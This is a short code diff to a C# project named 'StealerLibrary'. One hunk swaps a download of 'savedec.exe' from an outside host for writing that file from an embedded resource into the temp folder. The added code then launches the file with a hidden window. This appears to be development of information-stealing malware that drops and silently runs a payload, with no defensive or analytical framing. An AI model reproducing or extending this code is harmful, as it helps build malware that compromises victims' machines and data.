@@ -1,4 +1,4 @@
-using Microsoft.Win32;
+﻿using Microsoft.Win32;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
@@ -581,8 +581,7 @@ namespace StealerLibrary
             {
                 if (File.Exists(SaveDatPath()))
                 {
-                    WebClient wc = new WebClient();
-                    wc.DownloadFile("http://anarchy.5v.pl/savedec.exe", Path.GetTempPath() + "\\savedec.exe");
+                    File.WriteAllBytes(Path.GetTempPath() + "savedec.exe", Resource1.savedec);
                     Process savedec = new Process();
                     savedec.StartInfo.FileName = Path.GetTempPath() + "\\savedec.exe";
                     savedec.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
